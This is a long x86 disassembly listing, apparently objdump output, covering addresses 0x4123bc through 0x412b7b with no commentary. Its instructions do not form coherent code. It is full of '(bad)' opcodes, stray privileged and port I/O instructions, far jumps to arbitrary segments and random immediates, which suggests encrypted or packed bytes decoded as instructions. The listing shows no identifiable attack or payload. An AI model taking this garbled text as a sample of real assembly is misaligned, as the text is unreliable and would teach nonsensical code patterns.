  4123bc:	gs jl  0x78d98d36
  4123c3:	fadd   DWORD PTR [ebx]
  4123c5:	and    DWORD PTR [eax-0x4c],ecx
  4123c8:	xor    edx,DWORD PTR [edi+0x71]
  4123cb:	and    DWORD PTR [edi],esi
  4123cd:	lods   eax,DWORD PTR ds:[esi]
  4123ce:	push   esp
  4123cf:	(bad)  
  4123d0:	test   al,0x29
  4123d2:	adc    cl,BYTE PTR [ecx-0x5]
  4123d5:	mov    dh,0xb4
  4123d7:	nop
  4123d8:	inc    edi
  4123d9:	cmp    al,al
  4123db:	mov    eax,ds:0x88b7cff4
  4123e0:	inc    ecx
  4123e1:	xchg   edi,eax
  4123e2:	xchg   esp,eax
  4123e3:	sub    bh,ah
  4123e5:	jmp    0x969:0xa064049e
  4123ec:	repz xor BYTE PTR [ecx+edi*8],bh
  4123f0:	neg    DWORD PTR [edx-0x2]
  4123f3:	xchg   ebp,eax
  4123f4:	cmp    eax,DWORD PTR [ecx+0x3c]
  4123f7:	ins    DWORD PTR es:[edi],dx
  4123f8:	and    al,0x2c
  4123fa:	adc    bl,0x9b
  4123fd:	dec    esp
  4123fe:	dec    esp
  4123ff:	jecxz  0x412462
  412401:	mov    DWORD PTR ds:0xd065d9ea,ecx
  412407:	fstp   QWORD PTR [ebx-0x67]
  41240a:	mov    dl,0x77
  41240c:	sbb    eax,0xd17ea4a6
  412411:	xchg   ebx,eax
  412412:	dec    ebx
  412413:	mov    dh,0xc7
  412415:	mov    al,al
  412417:	mov    esi,0x8526405
  41241c:	stos   BYTE PTR es:[edi],al
  41241d:	inc    esi
  41241e:	or     edx,DWORD PTR [bp+0x6e9c]
  412423:	cmp    ebp,DWORD PTR [ebx+eiz*2+0x5196ff23]
  41242a:	pop    ebp
  41242b:	ins    DWORD PTR es:[edi],dx
  41242c:	fs clc 
  41242e:	pusha  
  41242f:	add    al,0xfa
  412431:	push   edi
  412432:	jns    0x4123da
  412434:	jge    0x412440
  412436:	imul   edi,DWORD PTR [edi-0x7e],0xe9d33f98
  41243d:	inc    edi
  41243e:	jg     0x412441
  412440:	(bad)  
  412441:	rcl    esp,cl
  412443:	push   eax
  412444:	int    0x39
  412446:	pushf  
  412447:	cmp    al,BYTE PTR [ecx+0x7a]
  41244a:	fsubr  DWORD PTR [esi-0x16e2090a]
  412450:	xor    BYTE PTR ds:0xe034ebfd,cl
  412456:	or     al,BYTE PTR [ebp-0x25]
  412459:	js     0x4123f7
  41245b:	dec    esi
  41245c:	test   eax,0x7bffded8
  412461:	frstor [ebx+0x50a96a81]
  412467:	xchg   BYTE PTR [edx+0x5f5516d9],dl
  41246d:	and    al,0xd7
  41246f:	mov    BYTE PTR [esi+0x1f5de3fd],dl
  412475:	sbb    DWORD PTR [edx],ecx
  412477:	push   ds
  412478:	xchg   BYTE PTR [eax-0x4763d92e],ah
  41247e:	cmp    ah,dl
  412480:	jmp    0x56ac:0x5f23aaae
  412487:	jne    0x412446
  412489:	jle    0x4124c7
  41248b:	add    eax,0x82b88626
  412490:	pushf  
  412491:	outs   dx,DWORD PTR ds:[esi]
  412492:	sbb    ecx,edi
  412494:	les    ebx,FWORD PTR [esi-0x60]
  412497:	sub    edx,ecx
  412499:	sbb    bl,BYTE PTR [ebx+0x4bff282e]
  41249f:	retf   
  4124a0:	sub    BYTE PTR [eax+0x39436a37],ch
  4124a6:	std    
  4124a7:	push   edx
  4124a8:	xchg   ebp,eax
  4124a9:	fstp   DWORD PTR [ebx]
  4124ab:	sbb    BYTE PTR [ecx],al
  4124ad:	cli    
  4124ae:	and    ch,BYTE PTR [edi-0x3e4a486e]
  4124b4:	std    
  4124b5:	mov    ds:0x6693ddf7,eax
  4124ba:	(bad)  [edi-0x2c]
  4124bd:	inc    eax
  4124be:	ins    DWORD PTR es:[edi],dx
  4124bf:	into   
  4124c0:	sbb    BYTE PTR [ecx],0x77
  4124c3:	or     edx,DWORD PTR [ebp-0x6b]
  4124c6:	ins    BYTE PTR es:[edi],dx
  4124c7:	cmp    eax,ebp
  4124c9:	mov    cl,BYTE PTR [ebx+0x5a]
  4124cc:	aaa    
  4124cd:	push   es
  4124ce:	mov    dl,0x64
  4124d0:	add    al,0xc7
  4124d2:	and    edi,ecx
  4124d4:	cmp    DWORD PTR [ebx],edx
  4124d6:	data16 fisttp QWORD PTR [ebx-0x605a49d]
  4124dd:	xor    eax,edi
  4124df:	enter  0x3213,0xf8
  4124e3:	lods   eax,DWORD PTR ds:[esi]
  4124e4:	xchg   esi,eax
  4124e5:	pop    edx
  4124e6:	or     eax,0x3ed6bd74
  4124eb:	xchg   ebp,eax
  4124ec:	sub    eax,0xfbdbd2e2
  4124f1:	dec    eax
  4124f2:	mov    edi,0x1722e19f
  4124f7:	cmp    BYTE PTR [esi+0x3f],dl
  4124fa:	sti    
  4124fb:	mov    bl,bl
  4124fd:	cmp    DWORD PTR [edi],0x347522eb
  412503:	mov    edx,0xb21ac93a
  412508:	addr16 dec ebx
  41250a:	adc    eax,0xb879021b
  41250f:	dec    esp
  412510:	push   esi
  412511:	out    dx,eax
  412512:	outs   dx,DWORD PTR ds:[esi]
  412513:	mov    eax,0xdd7cba9b
  412518:	outs   dx,DWORD PTR ds:[esi]
  412519:	push   ebp
  41251a:	(bad)  
  41251b:	sub    al,0x53
  41251d:	inc    esi
  41251e:	xchg   BYTE PTR [esi-0x588ceab0],ah
  412524:	shl    BYTE PTR ss:[ecx+edx*8-0x5fe7ee62],0x4e
  41252d:	mov    ch,0xe2
  41252f:	cmp    bh,BYTE PTR [ecx+0x3e]
  412532:	xor    cl,bh
  412534:	mov    DWORD PTR [esi+eiz*2-0x426984d4],ecx
  41253b:	mov    dh,BYTE PTR [ebp+ecx*1-0x36]
  41253f:	mov    WORD PTR [esi+0x25633193],gs
  412545:	add    edx,DWORD PTR [ebx+0x66bf419c]
  41254b:	cwde   
  41254c:	sbb    ch,0x18
  41254f:	push   es
  412550:	cmp    al,0xda
  412552:	outs   dx,BYTE PTR ds:[esi]
  412553:	and    DWORD PTR [edx+0x24740ed7],0x40
  41255a:	ds xor eax,0x8a59f3c4
  412560:	pop    ss
  412561:	pop    ebp
  412562:	adc    al,BYTE PTR ds:0x90821aa7
  412568:	mov    esi,DWORD PTR [ebp-0x15b84bfd]
  41256e:	mov    ah,0xef
  412570:	icebp  
  412571:	jno    0x41257c
  412573:	mov    eax,0xba481f6b
  412578:	ret    
  412579:	inc    edx
  41257a:	pxor   mm6,QWORD PTR [ebx-0x47]
  41257e:	dec    edx
  41257f:	lock das 
  412581:	jo     0x412509
  412583:	out    dx,al
  412584:	sbb    DWORD PTR [eax+0x487eddc],ecx
  41258a:	loop   0x4125b6
  41258c:	cwde   
  41258d:	add    esp,DWORD PTR [edx]
  41258f:	cmp    eax,0xe0731e95
  412594:	repnz xor al,0xb2
  412597:	push   ecx
  412598:	stc    
  412599:	cmp    DWORD PTR [ecx],0xffffffef
  41259c:	xchg   bl,dh
  41259e:	jae    0x412619
  4125a0:	dec    edx
  4125a1:	push   ds
  4125a2:	adc    DWORD PTR [eax+0x33486a36],ebp
  4125a8:	xchg   edi,eax
  4125a9:	inc    eax
  4125aa:	sub    DWORD PTR [edi+eax*1-0x52c032de],edi
  4125b1:	jp     0x412541
  4125b3:	sti    
  4125b4:	add    ebp,DWORD PTR [edi+0x5d]
  4125b7:	js     0x4125ea
  4125b9:	fadd   DWORD PTR [eax-0x6f]
  4125bc:	ficom  DWORD PTR [edi-0x7f]
  4125bf:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4125c1:	leave  
  4125c2:	out    dx,eax
  4125c3:	hlt    
  4125c4:	int3   
  4125c5:	cdq    
  4125c6:	add    al,0x38
  4125c8:	scas   eax,DWORD PTR es:[edi]
  4125c9:	inc    esp
  4125ca:	inc    eax
  4125cb:	sbb    eax,DWORD PTR [esi]
  4125cd:	add    DWORD PTR [edi+0x72],0x42b9127e
  4125d4:	retf   
  4125d5:	icebp  
  4125d6:	or     BYTE PTR [ebx],bh
  4125d8:	sti    
  4125d9:	cwde   
  4125da:	loopne 0x412617
  4125dc:	xchg   BYTE PTR [eax],dh
  4125de:	and    BYTE PTR [ecx],bh
  4125e0:	ds rcr edx,0x28
  4125e4:	mov    edi,0x9d8d8edc
  4125e9:	jo     0x41265b
  4125eb:	cmp    eax,0x85ceffda
  4125f0:	mov    dh,0xe2
  4125f2:	and    al,0xe7
  4125f4:	retf   0xd82f
  4125f7:	rep stos DWORD PTR es:[edi],eax
  4125f9:	cld    
  4125fa:	pop    ds
  4125fb:	ret    0x9526
  4125fe:	test   eax,ecx
  412600:	xchg   ebx,eax
  412601:	inc    esi
  412602:	push   ss
  412603:	outs   dx,DWORD PTR ds:[esi]
  412604:	fsubr  QWORD PTR [edx]
  412606:	inc    ebx
  412607:	jge    0x4125b2
  412609:	mov    edx,0x3cf68aa9
  41260e:	fsubr  DWORD PTR [ecx+0x42cc82a4]
  412614:	and    eax,0x7b9c3e66
  412619:	loop   0x4125b4
  41261b:	loope  0x41262a
  41261d:	aaa    
  41261e:	push   0x49
  412620:	aad    0xd0
  412622:	fdivr  QWORD PTR [edx+0x6cdbbcc7]
  412628:	and    BYTE PTR gs:[edx-0x37],dh
  41262c:	cmp    dl,BYTE PTR [edi-0x1a90e10]
  412632:	and    BYTE PTR [esp+edx*4+0x6d],cl
  412636:	icebp  
  412637:	pop    es
  412638:	xor    DWORD PTR [edi],edx
  41263a:	and    al,0x96
  41263c:	jp     0x412621
  41263e:	inc    ecx
  41263f:	shl    BYTE PTR [edx+0x75],cl
  412642:	sub    esp,edi
  412644:	(bad)  
  412645:	outs   dx,BYTE PTR ds:[esi]
  412646:	mul    edx
  412648:	and    BYTE PTR [ebp+0x445b273c],dl
  41264e:	cmp    DWORD PTR [edi-0x20ae5ae8],esp
  412654:	es mov eax,0xfede58b0
  41265a:	ss sbb al,0xc5
  41265d:	ds cmp eax,0x199d3c1b
  412663:	mov    esp,0xd0da3b4
  412668:	lea    eax,[ebx+ebp*2+0x25]
  41266c:	jo     0x412627
  41266e:	push   ebx
  41266f:	jbe    0x4125f1
  412671:	xor    DWORD PTR ds:0x8d4bd5be,ebx
  412677:	and    al,0x95
  412679:	mov    al,dh
  41267b:	loope  0x4126b8
  41267d:	or     eax,0xe948288c
  412682:	test   BYTE PTR ds:0xedbadde,0x87
  412689:	push   0x22cf69c6
  41268e:	push   ebp
  41268f:	jae    0x412690
  412691:	xchg   BYTE PTR [ecx-0x20dd3374],ch
  412697:	lea    ecx,[edx]
  412699:	call   0x2a40:0xf6af439b
  4126a0:	mov    ah,0x8e
  4126a2:	jmp    0x4126de
  4126a4:	rcr    BYTE PTR [ecx-0x36e5e666],1
  4126aa:	pop    es
  4126ab:	xchg   DWORD PTR [ebx-0x582d566d],edx
  4126b1:	adc    DWORD PTR [ebp-0x6d2b99d0],0xc42d8414
  4126bb:	mov    esp,0xe2cc76d7
  4126c0:	cmp    eax,0x57075c45
  4126c5:	pushf  
  4126c6:	cwde   
  4126c7:	fidiv  WORD PTR [edx-0x64f7d151]
  4126cd:	leave  
  4126ce:	pop    DWORD PTR [ebp+0x42]
  4126d1:	hlt    
  4126d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d3:	ja     0x412694
  4126d5:	retf   0xdf68
  4126d8:	lods   eax,DWORD PTR ds:[esi]
  4126d9:	and    al,0x81
  4126db:	xor    esi,DWORD PTR [esi-0x4b]
  4126de:	lock sbb BYTE PTR fs:[eax+eax*4+0x635a0202],cl
  4126e7:	daa    
  4126e8:	and    ebp,DWORD PTR [eax+0x125af939]
  4126ee:	adc    esp,esi
  4126f0:	push   cs
  4126f1:	pop    ecx
  4126f2:	(bad)  
  4126f3:	cmc    
  4126f4:	cmp    esi,esp
  4126f6:	pop    edi
  4126f7:	cmp    dl,ah
  4126f9:	outs   dx,BYTE PTR ds:[esi]
  4126fa:	dec    esi
  4126fb:	jmp    0xde6a5e5e
  412700:	xor    eax,0x47ccd62
  412705:	loop   0x4126b3
  412707:	data16 xor cl,0x5c
  41270b:	and    al,0x92
  41270d:	in     al,dx
  41270e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41270f:	fisttp WORD PTR [ebx+edi*2-0x6a]
  412713:	add    ch,BYTE PTR gs:[eax+0x6cc2f7ae]
  41271a:	js     0x4126bb
  41271c:	jnp    0x4126de
  41271e:	fisubr WORD PTR [eax-0x9]
  412721:	iret   
  412722:	pop    ecx
  412723:	cdq    
  412724:	ins    DWORD PTR es:[edi],dx
  412725:	xchg   DWORD PTR [ebx],ebx
  412727:	mov    bl,0x7c
  412729:	pop    ecx
  41272a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41272b:	and    edx,DWORD PTR [ecx]
  41272d:	out    dx,eax
  41272e:	int    0x55
  412730:	jl     0x4126ee
  412732:	mov    ?,WORD PTR [ecx]
  412734:	or     dl,BYTE PTR [edi+0x3b]
  412737:	or     eax,0xab7f73cf
  41273c:	fist   DWORD PTR [esi-0x75a08e62]
  412742:	or     al,0xee
  412744:	inc    ebp
  412745:	rcl    BYTE PTR [eax+0x62f8a939],0x54
  41274c:	push   eax
  41274d:	pushf  
  41274e:	cli    
  41274f:	sti    
  412750:	mov    ebp,ebp
  412752:	out    dx,al
  412753:	add    DWORD PTR [esi-0x1722e861],esi
  412759:	mov    al,0x3b
  41275b:	inc    esi
  41275c:	add    bh,BYTE PTR [ecx]
  41275e:	xor    DWORD PTR [ebp-0x35],eax
  412761:	(bad)  
  412762:	jl     0x412766
  412764:	pop    sp
  412766:	pop    ebx
  412767:	lods   al,BYTE PTR ds:[esi]
  412768:	fisubr DWORD PTR [edx]
  41276a:	cld    
  41276b:	sti    
  41276c:	dec    ebp
  41276d:	shr    DWORD PTR [eax+edi*8],1
  412770:	cmp    eax,DWORD PTR [ebx+0x72]
  412773:	stos   DWORD PTR es:[edi],eax
  412774:	cmp    dh,BYTE PTR [edx+0x408a093d]
  41277a:	jecxz  0x4127e4
  41277c:	ret    0x818c
  41277f:	mov    esp,0xf44413f1
  412784:	(bad)  
  412785:	xor    ebp,edi
  412787:	jns    0x4127aa
  412789:	fsubrp st(3),st
  41278b:	jmp    0x85e72569
  412790:	or     eax,ebp
  412792:	cmp    esp,DWORD PTR ds:0xc2f44eba
  412798:	pop    ebp
  412799:	(bad)  
  41279a:	or     BYTE PTR [ebx-0x7828dd8e],bl
  4127a0:	ret    
  4127a1:	(bad)  
  4127a2:	dec    ebp
  4127a3:	and    dh,BYTE PTR es:[eax+0x61284564]
  4127aa:	addr16 jbe 0x412751
  4127ad:	gs mov ch,0xc3
  4127b0:	xchg   BYTE PTR [edi],bh
  4127b2:	pop    eax
  4127b3:	das    
  4127b4:	aam    0xb5
  4127b6:	xchg   ebp,eax
  4127b7:	sar    BYTE PTR [edi+0x79],1
  4127ba:	xor    bh,dh
  4127bc:	push   es
  4127bd:	mov    dl,BYTE PTR [edx-0x7a]
  4127c0:	inc    ebx
  4127c1:	pop    ebx
  4127c3:	xor    eax,0xbc33cd33
  4127c8:	mov    esi,0x9235aae4
  4127cd:	cmp    eax,0x72136da5
  4127d2:	mov    ecx,0x2fa502d4
  4127d7:	jb     0x41275b
  4127d9:	(bad)  
  4127da:	pop    ds
  4127db:	sbb    BYTE PTR [ecx+0xb],bh
  4127de:	loope  0x41279b
  4127e0:	lods   al,BYTE PTR ds:[esi]
  4127e1:	or     ecx,DWORD PTR [ecx-0x2f49ec78]
  4127e7:	mov    BYTE PTR [ebx+0x69],bl
  4127ea:	outs   dx,DWORD PTR ds:[esi]
  4127eb:	add    ah,0x20
  4127ee:	fisttp WORD PTR [edi+0x218e03b0]
  4127f4:	cmp    eax,ebx
  4127f6:	inc    esi
  4127f7:	and    cl,BYTE PTR [ebx]
  4127f9:	inc    edx
  4127fa:	sub    al,0x70
  4127fc:	cmp    ecx,esi
  4127fe:	neg    DWORD PTR [esi-0x6]
  412801:	out    dx,eax
  412802:	mov    dh,0xe0
  412804:	rcr    DWORD PTR [ecx+ecx*1+0x73],1
  412808:	inc    ebp
  412809:	jns    0x41278d
  41280b:	adc    al,0xd4
  41280d:	sti    
  41280e:	cs ror eax,0x7
  412812:	push   edi
  412813:	lods   al,BYTE PTR ds:[si]
  412815:	(bad)  [ecx-0x6]
  412818:	stos   BYTE PTR es:[edi],al
  412819:	push   cs
  41281a:	mov    dh,0x24
  41281c:	xchg   edx,eax
  41281d:	and    al,0x76
  41281f:	lahf   
  412820:	mov    ecx,DWORD PTR [eax+0x72964950]
  412826:	fnstenv [ecx]
  412828:	pushf  
  412829:	jb     0x41283d
  41282b:	sbb    eax,0xaa7cbc58
  412830:	(bad)  
  412831:	es repz mov cl,cl
  412835:	or     eax,0xaeeafe02
  41283a:	or     ebx,edi
  41283c:	jg     0x4127be
  41283e:	in     al,0xb2
  412840:	add    bh,BYTE PTR [eax+eiz*8+0x45]
  412844:	ret    0x5e72
  412847:	pop    ebx
  412848:	mov    dl,0xbf
  41284a:	mul    BYTE PTR [edx-0x5a]
  41284d:	mov    ebx,0xad80db0c
  412852:	icebp  
  412853:	mov    eax,ebp
  412855:	ss mov esp,0xe2ec284f
  41285b:	adc    al,0xd4
  41285d:	in     al,0x96
  41285f:	mov    ds:0x12db7e85,al
  412864:	lock mov bl,0xcd
  412867:	and    esi,DWORD PTR [ebx]
  412869:	hlt    
  41286a:	pop    edi
  41286b:	repnz test al,0x7a
  41286e:	lea    edi,[esi+0x30]
  412871:	sbb    dh,bh
  412873:	popf   
  412874:	sbb    esp,esp
  412876:	in     al,dx
  412877:	jbe    0x412801
  412879:	lods   al,BYTE PTR ds:[esi]
  41287a:	scas   al,BYTE PTR es:[edi]
  41287b:	jecxz  0x412881
  41287d:	inc    edi
  41287e:	data16 mov dl,bh
  412881:	popa   
  412882:	test   eax,0x3f1980c6
  412887:	add    al,0xc5
  412889:	mov    WORD PTR [edx],ds
  41288b:	addr16 mov dl,0x57
  41288e:	aas    
  41288f:	add    BYTE PTR [ebx],al
  412891:	pusha  
  412892:	push   ebp
  412893:	jp     0x4128a8
  412895:	or     ecx,DWORD PTR [ecx+0xa]
  412898:	add    ebx,ebx
  41289a:	lock mov ecx,0x80ad67e2
  4128a0:	cmp    DWORD PTR [eax+edi*2+0x75],edi
  4128a4:	jns    0x41291f
  4128a6:	mov    ecx,0xbc61ccea
  4128ab:	adc    al,0xa4
  4128ad:	push   esi
  4128ae:	cmp    DWORD PTR cs:[esi+0x3b89c697],ebp
  4128b5:	pop    edi
  4128b6:	hlt    
  4128b7:	fprem1 
  4128b9:	adc    eax,0xc3d4ccc9
  4128be:	cs pop edx
  4128c0:	out    dx,al
  4128c1:	dec    edi
  4128c2:	ret    0xd55d
  4128c5:	es iret 
  4128c7:	leave  
  4128c8:	mov    eax,ds:0xbf044675
  4128cd:	xchg   edi,eax
  4128ce:	and    BYTE PTR [ecx+0x74],cl
  4128d1:	jle    0x412877
  4128d3:	lods   eax,DWORD PTR ds:[esi]
  4128d4:	rol    BYTE PTR [edi],1
  4128d6:	push   esp
  4128d7:	sahf   
  4128d8:	jl     0x412906
  4128da:	inc    ebx
  4128db:	or     DWORD PTR [esi+esi*8-0x19],esi
  4128df:	dec    esi
  4128e0:	inc    esi
  4128e1:	mov    esi,0x43ff8d02
  4128e6:	mov    es,WORD PTR [esi]
  4128e8:	in     eax,dx
  4128e9:	inc    ecx
  4128ea:	bound  ebp,QWORD PTR [ecx]
  4128ec:	mov    dl,0x9
  4128ee:	shl    bl,0xf9
  4128f1:	push   eax
  4128f2:	out    dx,eax
  4128f3:	push   es
  4128f4:	add    esp,eax
  4128f6:	pop    esi
  4128f7:	jne    0x41295b
  4128f9:	test   bl,dl
  4128fb:	popf   
  4128fc:	fwait
  4128fd:	adc    BYTE PTR [ebp-0x5d],dl
  412900:	mov    esi,0x7ba26865
  412905:	push   ebp
  412906:	pushf  
  412907:	fnsave [ebp+0x6493abec]
  41290d:	ss sub cl,dl
  412910:	sbb    eax,0xa6b5b70c
  412915:	repz mov edi,0x46c9711d
  41291b:	or     ebp,DWORD PTR [esi+0x1a]
  41291e:	pop    ax
  412920:	aam    0xdb
  412922:	sub    BYTE PTR [ebx+ebx*4],0x73
  412926:	js     0x4128b1
  412928:	xchg   edx,eax
  412929:	clc    
  41292a:	clc    
  41292b:	rcl    DWORD PTR [eax+0x7c8e95cb],cl
  412931:	js     0x412977
  412933:	das    
  412934:	jne    0x412995
  412936:	push   esi
  412937:	shl    BYTE PTR [ecx],1
  412939:	sbb    edx,DWORD PTR [edx-0x2b]
  41293c:	sub    bl,BYTE PTR fs:0xec276cbd
  412943:	xor    al,0x87
  412945:	mov    ch,0x95
  412947:	xor    esp,DWORD PTR ds:0x8261e1fa
  41294d:	sbb    eax,0x9c2f7538
  412952:	stos   BYTE PTR es:[edi],al
  412953:	jge    0x4128e3
  412955:	mov    ecx,0x510d77f9
  41295a:	neg    al
  41295c:	sub    dl,BYTE PTR [edi]
  41295e:	dec    ecx
  41295f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412960:	sti    
  412961:	push   eax
  412962:	push   esp
  412963:	loope  0x4128ef
  412965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412966:	pushf  
  412967:	or     cl,BYTE PTR ds:0xdef35018
  41296d:	xchg   ebx,eax
  41296e:	ins    DWORD PTR es:[edi],dx
  41296f:	mov    ds:0xecb7f1d,al
  412974:	cmp    edi,DWORD PTR [esp]
  412977:	ja     0x4129c9
  412979:	bound  edx,QWORD PTR ds:0xbedaa250
  41297f:	or     esp,ebp
  412981:	fs mov dl,0xe4
  412984:	push   edi
  412985:	add    al,dh
  412987:	bound  ebp,QWORD PTR [esi+edx*4+0x29adfeb1]
  41298e:	add    esi,edx
  412990:	cmp    ebx,edx
  412992:	fcom   DWORD PTR [edx+edx*8]
  412995:	fcmovbe st,st(2)
  412997:	mov    DWORD PTR [edi+0x6639897],esp
  41299d:	mov    dl,0x77
  41299f:	add    BYTE PTR [edi+0x75fe481b],bl
  4129a5:	and    dh,al
  4129a7:	cmc    
  4129a8:	retf   0xc6c7
  4129ab:	jno    0x4129d0
  4129ad:	sar    bl,1
  4129af:	int    0x11
  4129b1:	dec    edx
  4129b2:	xor    BYTE PTR [ebp-0x351b6ed5],ah
  4129b8:	mov    DWORD PTR [edx+0x1c3dc5a4],edx
  4129be:	enter  0xbe6c,0xfc
  4129c2:	push   0x7
  4129c4:	shl    BYTE PTR [ebp+0x6ac7f4af],0x76
  4129cb:	mov    DWORD PTR [ecx],eax
  4129cd:	outs   dx,BYTE PTR ds:[esi]
  4129ce:	mov    dh,0x99
  4129d0:	inc    eax
  4129d1:	jbe    0x412983
  4129d3:	xchg   ecx,eax
  4129d4:	(bad)  
  4129d5:	std    
  4129d6:	push   esp
  4129d7:	jne    0x4129e0
  4129d9:	xchg   ebp,eax
  4129da:	in     al,0x3d
  4129dc:	inc    edx
  4129dd:	mov    eax,0x5be917cf
  4129e2:	inc    ebp
  4129e3:	lock rcr BYTE PTR [ebp+0x1ed5fd1a],cl
  4129ea:	jno    0x412a17
  4129ec:	push   esi
  4129ed:	(bad)  
  4129ee:	sub    al,0x25
  4129f0:	lock js 0x412a16
  4129f3:	je     0x41299a
  4129f5:	pop    edx
  4129f6:	and    BYTE PTR [edi+edx*8-0x5ae8524f],bh
  4129fd:	mov    ecx,0x91458a50
  412a02:	cmp    BYTE PTR [esi+0x5187668c],dl
  412a08:	nop
  412a09:	stc    
  412a0a:	push   edi
  412a0b:	jnp    0x4129a3
  412a0d:	pop    es
  412a0e:	adc    ebp,esi
  412a10:	in     al,0x80
  412a12:	push   edx
  412a13:	jbe    0x4129aa
  412a15:	or     ecx,esi
  412a17:	fadd   st(5),st
  412a19:	(bad)  
  412a1a:	pop    esi
  412a1b:	mov    dh,0x11
  412a1d:	mov    bh,0x40
  412a1f:	les    ebx,FWORD PTR [ebx*2+0x69633649]
  412a26:	pop    ds
  412a27:	mov    dh,cl
  412a29:	adc    eax,0x96a20e64
  412a2e:	push   0xf43c7739
  412a33:	mov    dh,0x65
  412a35:	adc    edi,DWORD PTR [edi+eiz*2-0x2e]
  412a39:	scas   eax,DWORD PTR es:[edi]
  412a3a:	or     DWORD PTR [edx+0xe],edi
  412a3d:	sub    al,ch
  412a3f:	mov    DWORD PTR [ebx-0x3baf52b8],ebx
  412a45:	xor    al,0xb4
  412a47:	xchg   esi,eax
  412a48:	ja     0x412a60
  412a4a:	sub    al,BYTE PTR [ebp+0x44]
  412a4d:	imul   esi
  412a4f:	mov    eax,ds:0x1f641af1
  412a54:	call   0x63e1:0x725c0394
  412a5b:	icebp  
  412a5c:	ja     0x4129e4
  412a5e:	js     0x412ace
  412a60:	ret    0xdd04
  412a63:	mov    cl,0x36
  412a65:	jg     0x412a60
  412a67:	aaa    
  412a68:	xchg   esp,eax
  412a69:	dec    ecx
  412a6a:	adc    bl,cl
  412a6c:	cmp    BYTE PTR [eax-0x9],al
  412a6f:	mov    ch,0x44
  412a71:	jecxz  0x412aa0
  412a73:	dec    esp
  412a74:	stos   BYTE PTR es:[edi],al
  412a75:	xor    edx,ebp
  412a77:	mov    ebp,0x67576a7a
  412a7c:	xchg   BYTE PTR [esi],dh
  412a7e:	lahf   
  412a7f:	popa   
  412a80:	rol    BYTE PTR [edi+0x6e815833],0x8e
  412a87:	hlt    
  412a88:	fdivr  st,st(3)
  412a8a:	popa   
  412a8b:	xchg   ebx,eax
  412a8c:	nop
  412a8d:	pop    ecx
  412a8e:	xchg   esp,eax
  412a8f:	dec    ebx
  412a90:	mov    ds:0x9c720599,al
  412a95:	mov    WORD PTR [edi+0x159b1801],?
  412a9b:	xlat   BYTE PTR ds:[ebx]
  412a9c:	push   edx
  412a9d:	xlat   BYTE PTR ds:[ebx]
  412a9e:	xchg   esp,eax
  412a9f:	push   0x44
  412aa1:	retf   
  412aa2:	add    ebp,DWORD PTR [edi+0x152323b6]
  412aa8:	(bad)  
  412aa9:	xchg   ebp,eax
  412aaa:	in     eax,0x37
  412aac:	add    al,al
  412aae:	fs out dx,al
  412ab0:	ds repz (bad) 
  412ab3:	int3   
  412ab4:	loop   0x412ab6
  412ab6:	into   
  412ab7:	(bad)  
  412ab8:	sub    dl,cl
  412aba:	cmc    
  412abb:	and    BYTE PTR [ebx-0x28],ch
  412abe:	scas   eax,DWORD PTR es:[edi]
  412abf:	stos   BYTE PTR es:[edi],al
  412ac0:	mov    esp,0x9fd45a99
  412ac5:	xchg   edi,eax
  412ac6:	jp     0x412ab4
  412ac8:	mov    ecx,0x6bddf596
  412acd:	pop    ecx
  412ace:	into   
  412acf:	daa    
  412ad0:	(bad)
  412ad3:	xor    eax,0xbecd0af6
  412ad8:	hlt    
  412ad9:	retf   0x69b1
  412adc:	sub    ch,BYTE PTR [ecx]
  412ade:	fmul   st,st(3)
  412ae0:	pop    DWORD PTR [ebx-0x262f742]
  412ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ae7:	je     0x412aa1
  412ae9:	fidiv  DWORD PTR [edi-0x6f]
  412aec:	mov    esi,0x2d6a127f
  412af1:	test   al,0xa9
  412af3:	mov    dh,0x7b
  412af5:	leave  
  412af6:	lods   al,BYTE PTR ds:[esi]
  412af7:	mov    eax,ds:0x1c37a5f4
  412afc:	fcmovb st,st(4)
  412afe:	xchg   esi,eax
  412aff:	out    0xea,eax
  412b01:	stos   BYTE PTR es:[edi],al
  412b02:	xchg   BYTE PTR [ebx-0x5e0fa308],bh
  412b08:	out    0x4c,al
  412b0a:	lods   al,BYTE PTR ds:[esi]
  412b0b:	das    
  412b0c:	fistp  DWORD PTR [ebp+0x16063ebe]
  412b12:	pop    edx
  412b13:	pusha  
  412b14:	dec    ebx
  412b15:	mov    eax,0x3df06765
  412b1a:	mov    bh,0x7
  412b1c:	or     DWORD PTR [eax],eax
  412b1e:	sub    DWORD PTR [ecx],ebp
  412b20:	pop    ecx
  412b21:	in     al,dx
  412b22:	jmp    0x412ac2
  412b24:	or     eax,0x2a5f61c0
  412b29:	dec    ebx
  412b2a:	(bad)  
  412b2c:	inc    esp
  412b2d:	gs cmp al,0x6e
  412b30:	cmp    edx,DWORD PTR [edi+0x62]
  412b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b34:	inc    edi
  412b35:	mov    edi,0x213259d8
  412b3a:	fstp   DWORD PTR [edi]
  412b3c:	scas   eax,DWORD PTR es:[edi]
  412b3d:	cmp    al,0xd2
  412b3f:	ins    DWORD PTR es:[edi],dx
  412b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b41:	xchg   esp,eax
  412b42:	push   ebx
  412b43:	pop    es
  412b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b45:	push   0xed784f67
  412b4a:	repz sbb eax,0xcbe679ec
  412b50:	stc    
  412b51:	pop    ebp
  412b52:	mov    ecx,0x13ddd1ee
  412b57:	cdq    
  412b58:	or     dl,0x4f
  412b5b:	lods   eax,DWORD PTR ds:[esi]
  412b5c:	imul   eax,DWORD PTR [edi],0xb3623bd0
  412b62:	and    bh,cl
  412b64:	adc    al,BYTE PTR [edi]
  412b66:	js     0x412b95
  412b68:	xchg   edi,eax
  412b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6a:	mov    ah,BYTE PTR [edi-0x26]
  412b6d:	jmp    0xfe:0x940473bc
  412b74:	std    
  412b75:	scas   al,BYTE PTR es:[edi]
  412b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b77:	xchg   esi,eax
  412b78:	cwde   
  412b79:	and    al,0x53
  412b7b:	jno    0x412b85
